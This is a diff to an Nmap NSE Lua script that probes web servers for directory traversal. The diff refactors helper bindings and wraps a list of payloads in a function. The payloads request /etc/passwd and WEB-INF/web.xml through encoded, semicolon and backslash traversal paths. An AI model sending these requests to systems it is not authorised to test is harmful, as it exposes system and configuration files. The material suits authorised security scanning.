@@ -5,17 +5,8 @@ local shortport = require "shortport"
 
 
 
--- nmp function cache
-local nmap_register = nmap.register_script
-local nmap_settitle = nmap.set_title
-local nmap_resolve = nmap.resolve
-local nmap_get_port_state = nmap.get_port_state
-local nmap_set_port_state = nmap.set_port_state
-local comm = nmap.comm
-local new_socket = nmap.new_socket
-local get_timeout = nmap.get_timeout
-
--- Performance optimizations
+-- Fast-path bindings for the stdlib and nmap API used by this script.
+-- Kept strict-mode safe: every name below is a declared local.
 local format = string.format
 local lower = string.lower
 local upper = string.upper
@@ -31,26 +22,51 @@ local concat = table.concat
 local insert = table.insert
 local remove = table.remove
 local sort = table.sort
-local move = table.move or function(a1, f, e, t, a2)
-    if not a2 then a2 = a1 end
-    for i = f, e do a2[t + i - f] = a1[i] end
-    return a2
-end
+local move = table.move
 local tostring = tostring
 local tonumber = tonumber
 local type = type
 local pcall = pcall
 local pairs = pairs
 local ipairs = ipairs
-local unpack = unpack or table.unpack
+local unpack = table.unpack
 local setmetatable = setmetatable
 local getmetatable = getmetatable
 local error = error
 local select = select
+
 local clock = nmap.clock
 local msleep = nmap.msleep
-local sleep = stdnse.sleep
-local strsplit = stdnse.strsplit
+
+-- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
+local sleep = function(seconds)
+    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
+end
+
+local strsplit = function(sep, str, max)
+    local out, pos, n = {}, 1, 0
+    if str == nil then return out end
+    while true do
+        if max and n >= max - 1 then
+            out[#out + 1] = sub(str, pos)
+            return out
+        end
+        local s, e = find(str, sep, pos)
+        if not s then
+            out[#out + 1] = sub(str, pos)
+            return out
+        end
+        if e < pos then e = pos end
+        out[#out + 1] = sub(str, pos, s - 1)
+        pos = e + 1
+        n = n + 1
+        if pos > #str then
+            out[#out + 1] = ""
+            return out
+        end
+    end
+end
+
 local format_output = stdnse.format_output
 local output_table = stdnse.output_table
 
@@ -74,7 +90,8 @@ action = function(host, port)
       server_version = match(server_banner, "nginx/([%d%.]+)")
     end
 
-    local payloads = {
+    local function build_payloads(host)
+    local items = {
       {path = "/static/../etc/passwd", checks = {"root:.*:0:0:", "daemon:.*:1:1:", "bin:.*:2:2:"}, label = "static traversal"},
       {path = "/assets/..%2f..%2fetc/passwd", checks = {"root:", "daemon:", "nobody:"}, label = "encoded traversal"},
       {path = "/files/..;/..;/etc/passwd", checks = {"root:", "daemon:"}, label = "semicolon traversal"},
@@ -83,9 +100,12 @@ action = function(host, port)
       {path = "/static/..%2f..%2fWEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "encoded WEB-INF"},
       {path = "/assets/..\\..\\WEB-INF\\web.xml", checks = {"web%-app"}, label = "backslash traversal"},
       {path = "/..;/..;/WEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "matrix traversal"},
+    
     }
+    return items
+end
 
-    for _, p in ipairs(payloads) do
+    for _, p in ipairs(build_payloads(host)) do
       local req = http.get(host, port, p.path)
       if req and req.status and req.status >= 200 and req.status < 400 then
         local body = req.body or ""
